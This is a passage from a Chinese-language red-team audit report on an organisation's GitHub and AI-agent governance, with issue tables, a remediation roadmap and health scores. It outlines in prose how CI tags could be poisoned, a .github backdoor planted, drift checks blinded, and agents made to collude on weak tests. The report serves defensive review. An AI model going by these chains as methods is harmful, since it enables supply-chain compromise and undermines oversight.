| P1-25 | E3 | admin唯一性漂移(§9)会导致所有依赖唯一admin=owner的规则归因混乱 | §8直推检测不知道谁是真正owner，破玻璃权限错配 |
| P1-26 | F1 | Actions白名单(CI-2)只控来源允许，不控是否pin commit hash | 浮tag引用action→上游被投毒时全组织中招 |
| P1-27 | G1 | typescript when=frontend-isomorphic 的条件无自动化判定+enforcement级别未明 | TS后端服务只靠reviewer记忆拦，极易漏 |
| P1-28 | H3 | T-10 mutation weekly测试分数<60%时，无自动开issue+指派责任人 | 结果只是Actions artifact没人看，fake_tests风险永久敞口 |
| P1-29 | 第三轮D1 | builder与test-author表面不同声明但prompt由同一人写，测试放水 | 族级独立校验只能防model family，防不了prompt串通 |
| P1-30 | 第三轮D2 | ephemeral handoff数组只声明[artifacts-pr]就可过validate.py，故意不写retrospective/adr-write | 过程坏决策无法提炼，下一次团队重踩坑 |
| P1-31 | 第三轮E2 | agent/skill引用无固定版本号(@latest / skill:xxx不带version) | validate.py不校验"引用方是否显式同意major升级"，破坏性升级静默生效 |

---

## 第三部分：P2级问题清单（16项）

| ID | 来源 | 描述 |
|----|------|------|
| P2-01 | S1-06 | flows.new_repo定义的4步不完整，步骤5(首功能PR)和6(首版发布)是流程外延伸，无明确门禁 |
| P2-02 | S1-07 | RL1只有编号，无具体release门禁明细（CHANGELOG/tag签名/deployment审批链等） |
| P2-03 | S2-06 | C1评审人数未定义，CODEOWNERS隐式推导=owner一人说了算，无副审 |
| P2-04 | S2-07 | ADR创建无编号冲突检测，多人同时创建ADR-012冲突 |
| P2-05 | S3-08 | skill-extract产出的新skill初始status值未规范（draft/submitted/proposed?） |
| P2-06 | S3-09 | handoff的artifacts-pr合并时序不明确（§4审核前合并=不合格代码进main） |
| P2-07 | C4 | 族级独立(不同model family)是软约束，validate.py默认不查models.yaml family |
| P2-08 | D2 | credential.github_app字段不是enum，可写任意非cloudbrid-agent名→运行时才失败 |
| P2-09 | D3 | capabilities.allow引用未定义副作用值fail-closed的enforcement可能是warning而非fail |
| P2-10 | D4 | judge archetype的as_tool=true（违反allOf if/then）需回归测试case防手写校验漏写 |
| P2-11 | G3 | license policy缺少review-required灰区层级（LGPL/MPL等边界copyleft） |
| P2-12 | S4-08 | Hotfix破玻璃流程步骤/授权时长/回填审计链均未定义，紧急卡死在等owner |
| P2-13 | S4-09 | dependabot auto-merge对major/minor/patch不区分，可能major被自动合 |
| P2-14 | S3步骤B | decision_made事件的rationale摘要格式/长度/结构化要求均未定义 |
| P2-15 | 第三轮C3 | ADR与schema修改在同一C1 PR的鸡生蛋问题，评审流程无变更顺序指导 |
| P2-16 | 第三轮F3 | Actions白名单拒绝的错误消息不直接打到PR review comment，开发者体验差 |

---

## 第四部分：P3级问题清单（10项）

| ID | 来源 | 描述 |
|----|------|------|
| P3-01 | S1-08 | 业务CODEOWNERS分层后，建议设置治理委员会副审团队提升效率 |
| P3-02 | S2-08 | C1级变更未明确禁止auto-merge，需ruleset条件层限制 |
| P3-03 | S2-09 | apply.sh用terraform重写以获plan/apply/state回滚能力 |
| P3-04 | S3-10 | decision_made.rationale强制markdown结构化，含≥2个选项+选择+推理 |
| P3-05 | S3-11 | team声明count>1时，事件流需instance_id区分实例 |
| P3-06 | S4-10 | 普通业务PR的builder/test-author独立性适用范围（≥500LOC才强制双agent） |
| P3-07 | S4-11 | PR body的agent声明格式模板化，含agent_id/team_id/risk_level/change_scope |
| P3-08 | A2 | drift-check区分403/404，对403私有仓"无法验证"单独标记而非误报 |
| P3-09 | CodeQL | gate加CodeQL timeout设置，防止扫描30分钟+超时导致gate永远pending |
| P3-10 | 第三轮 | 建议设置治理仓weekly read-only审计例会，review本周所有C1/C2变更清单 |

---

## 第五部分：跨类别复合风险矩阵（3大结构性缺陷 × 攻击场景关联图）

```
                    +---------------------------------------------+
                    |      STRUCT-01: 漂移监控不可信 (P0-19)       |
                    |      (C1幂等漏洞 + §8正则伪造 + 9段零内容校验) |
                    +------------------+--------------------------+
                                       | 配合后"永不被发现"
                                       v
+-------------------------------+   +------------------------------------------+
| STRUCT-02: Owner单点+无灾备    |   | STRUCT-03: 供应链绿色误判三层通道          |
| (P0-08/P0-22)                 |   | (P0-20 CI-Workflows v1覆盖                 |
|  admin==1 唯一人              |---+  + P0-15 Action内部行为不检                |
|  CODEOWNERS全路径             |   |  + P0-21 .github后门（CodeQL排除）         |
|  三仓零deletion_protection    |   |  + P0-11 policy/ 可绕过C1直接改           |
+---------------+---------------+   +------------------+-----------------------+
                |                                       |
                |  owner休假=流程全死                   |  攻击者控制了gate输出=
                |  owner被盗=三仓被删=组织瘫痪           |  所有业务仓任意代码"绿"
                v                                       v
     【最大业务连续性风险】                    【最大安全风险】
     RTO未知，RPO 3-14天                        后门潜伏数月，数据/代码全泄露
```

**风险叠加原理**：单独看P0-08(CODEOWNERS单点)、P0-19(漂移幂等漏洞)、P0-20(CI-Workflows tag覆盖)各自只是"单点故障"。但**当攻击者同时利用它们时**——先用P0-19让drift-check失明，再利用P0-22中owner账号被盗的场景获得admin权限，然后做P0-20覆盖CI-Workflows tag投毒——三条链组合起来就是：**从外部写入恶意代码到所有业务仓生产环境，全程0报警，永不被发现。**

这也是为什么本报告把这三条都标成P0且必须在72h内同时启动修复的原因——任何一条不补，另外两条的防护也会被绕开。

---

## 第六部分：分阶段修复路线图

### 阶段 0：紧急止血（24小时内，3项必须完成）

| 序号 | 修复项 | 关联问题 | 负责人 | 验收标准 |
|------|--------|----------|--------|----------|
| 0-1 | 治理漂移issue幂等逻辑修复：label+精确前缀匹配+分页兜底 | P0-19 | infra/owner | governance-drift workflow的gh issue list调用加--label和startswith过滤 |
| 0-2 | GitHub Org 设 `members_can_create_repositories=false` | P0-01 | owner | Org Settings验证开关已开 |
| 0-3 | 三仓（.github/CI-Workflows/agent-registry）开 deletion_protection | P0-22 | owner | 仓Settings验证删除保护已启用 |

### 阶段 1：核心修复（72小时内，7项必须完成）

| 序号 | 修复项 | 关联问题 |
|------|--------|----------|
| 1-1 | CODEOWNERS分层改造（治理路径/业务路径/dependabot PR） | P0-08 |
| 1-2 | drift-check §8直推正则加前置空格 + GitHub API二次校验PR号真实存在+sha匹配 | P0-14 |
| 1-3 | 三仓冷备：创建Cloudbird-Backup org，每日git push --mirror镜像备份 | P0-22 |
| 1-4 | new-repo-init.sh 加 CodeQL Default Setup 自动启用 | P0-02 |
| 1-5 | C1 scope 增补 policy/ + CODEOWNERS + workflows/ 三个高影响路径 | P0-11 / P0-12 |
| 1-6 | codeql-gate ruleset移除.github仓的exclude | P0-21 |
| 1-7 | Actions白名单精确化（Cloudbird-Software/*通配改具体仓列表）+ 所有uses行强制pin 40位hash | P0-15 / P1-26 |

### 阶段 2：关键校验实现（1周内，8项启动）

| 序号 | 修复项 | 关联问题 |
|------|--------|----------|
| 2-1 | validate.py实现AR-8族级独立检查（model family比对） | P0-05 |
| 2-2 | validate.py实现verification.test_authors archetype检查（必须test-author≠builder） | P0-13 |
| 2-3 | team-destroyer workflow：监听teams/*.yaml status→archived+handoff_done=true自动销毁 | P0-06 |
| 2-4 | mechanism:verifier机制枚举化+validate.py校验 | P0-07 |
| 2-5 | MOD-3行数统计脚本 + gate集成 | P0-09 |
| 2-6 | apply-governance on-merge workflow：dry-run → owner确认 → apply | P0-04 |
| 2-7 | flaky_tracker + flaky-gate workflow（T-08执行引擎） | P0-17 |
| 2-8 | detect_triggers.py + G-01~G-08 extractor定义（trigger引擎） | P0-18 |

### 阶段 3：剩余P1项落地（2周内）
- drift-check §7c planned-超时/已存在仓联动
- C1跨仓变更"提交束"原子性机制
- ADR status自动翻转脚本
- drift-check §10 治理仓内部一致性校验
- team archive_to cross-ref 存在性校验
- handoff 6项完整性强制（minItems=6 + 每项enum唯一）
- persistent team 反向引用保护（防止被删时ephemeral雪崩）
- 破玻璃回填PR模板 + 三件套校验CI job
- §9 vs §8 执行顺序：admin漂移时§8升级判定
- App权限形状webhook实时监测
- CodeQL dismiss owner-only限制
- testing.yaml T-xx阈值量化
- REPOS.yaml exempt双列表（drift-check + gate）语义对齐

### 阶段 4：P2/P3 效率与最佳实践（1个月内）
- ADR编号冲突检测
- C1评审副审要求
- handoff artifacts结构化hash收集
- squash后commit message CI校验
- decision_made rationale结构化校验
- languages.yaml每种语言when条件的CI判定
- heavy_orm AST级检查（gorm AutoMigrate ban）
- MOD-3"模块"定义文档化
- 依赖审批白名单APPROVED_DEPENDENCIES.yaml引入
- dependabot minor/patch vs major auto-merge粒度区分

---

## 第七部分：治理体系健康度评分（演练前基线）

| 维度 | 满分 | 当前得分 | 说明 |
|------|------|----------|------|
| 1. 意图完整性（文档声明覆盖度） | 20 | **16/20** | GOVERNANCE.yaml/policy/schema三大文件覆盖度高，意图表达清晰 |
| 2. 门禁自动化率（enforced项是否真有CI/平台实现） | 20 | **7/20** | 严重偏低：大量声明enforced的项实际无实现（MOD-3行数/AR-8族级独立/T-08/G-01~G-08 trigger等） |
| 3. 异常处理与边界覆盖 | 15 | **3/15** | 极低：C1 scope边界有漏洞、handoff边界空、status迁移权限空、exempt语义不对齐 |
| 4. 监控与漂移检测可信度 | 15 | **4/15** | 极低：幂等漏洞+正则伪造+内容零校验+周检太慢=监控不可信（STRUCT-01） |
| 5. 灾备与单点容错 | 15 | **1/15** | 极低：owner单点、三仓零保护、零DR runbook（STRUCT-02） |
| 6. 供应链纵深防御 | 15 | **4/15** | 低：白名单粗、无pin hash、Action零内部扫描、CodeQL排除.github仓（STRUCT-03） |
| **总分** | **100** | **35/100** | **整体健康度D+级：声明意图优秀(80%)，实现落地差(35%)，纵深防御差(18%)** |

### 健康度目标曲线
- 阶段0/1完成后（3天）：目标得分 = **55/100**（3项STRUCT-01/02/03核心缺陷被封堵）
- 阶段2完成后（1周）：目标得分 = **72/100**（校验实现到位，P0级清零）
- 阶段3完成后（2周）：目标得分 = **85/100**（P1级清零，边界覆盖完善）
- 阶段4完成后（1月）：目标得分 = **92/100**（效率优化完成，流程进入运营态）

---

## 附录：三轮演练的所有原始场景索引

| 轮次 | 场景编号 | 场景名称 | 发现问题数 |
|------|----------|----------|------------|
| 第一轮 | S1 | 新业务仓创建流程（flows.new_repo 6步） | 8 |
| 第一轮 | S2 | C1级治理变更（新增documenter archetype，6步） | 9 |
| 第一轮 | S3 | agent团队ephemeral生命周期（订单重写，5步） | 11 |
| 第一轮 | S4 | 普通业务PR流程（3500行Go模块+新依赖，7步） | 11 |
| 第二轮 | A | REPOS.yaml边界状态（A1~A4，4case） | 4 |
| 第二轮 | B | 治理变更分级边界（B1~B5，5case） | 5 |
| 第二轮 | C | 团队生命周期边界（C1~C5，5case） | 5 |
| 第二轮 | D | agent身份与权限边界（D1~D4，4case） | 4 |
| 第二轮 | E | 破玻璃与直推边界（E1~E3，3case） | 3 |
| 第二轮 | F | Actions白名单边界（F1~F3，3case） | 3 |
| 第二轮 | G | 语言政策边界（G1~G3，3case） | 3 |
| 第二轮 | H | 测试政策边界（H1~H3，3case） | 3 |
| 第三轮 | A类 | 绕过治理硬防线（A1 CI tag投毒/A2 .github后门/A3 exempt扩大化） | 3 |
| 第三轮 | B类 | 制造流程死锁（B1 owner单点死锁/B2 governance-core解散归档雪崩/B3 registry状态卡死） | 3 |
| 第三轮 | C类 | 反馈循环与资源耗尽（C1漂移issue淹没/C2 dependabot循环/C3 PR乒乓死循环） | 3 |
| 第三轮 | D类 | agent运行时攻击（D1 builder自测自建串通/D2 handoff选择性遗忘） | 2 |
| 第三轮 | E类 | 结构性缺陷（E1三仓单点灾备缺失/E2版本化真空） | 2 |

---

## 报告结语

本次红队演练验证了一个核心结论：**Cloudbird-Software 的治理体系在"声明意图"层面属于业界顶级水准（GOVERNANCE.yaml 分层分域分强度的设计、agent archetype 九分类+族级独立思想、三层治理仓分层架构、ephemeral team手off机制都是高水平设计），但在"实现落地"和"纵深防御"层面存在大量结构性断点——79项问题中，67项是"规则写了但无实现/实现弱"，不是设计问题，是实现问题。**

好消息是：不需要推倒重来。只要按阶段0→阶段4的路线图，用1个月时间把P0/P1的53项补完，健康度可从35分提升到85分以上。最关键的P0级三大结构性缺陷（STRUCT-01/02/03）可以在72小时内被封堵。

建议：这份报告本身应作为 ADR-XXXX 归档进 agent-registry/decisions/，并在 governance-drift workflow 中加一个"治理健康度月报"的cron job，每季度重跑一次红队演练并更新此报告的修复进度表。

**报告结束**
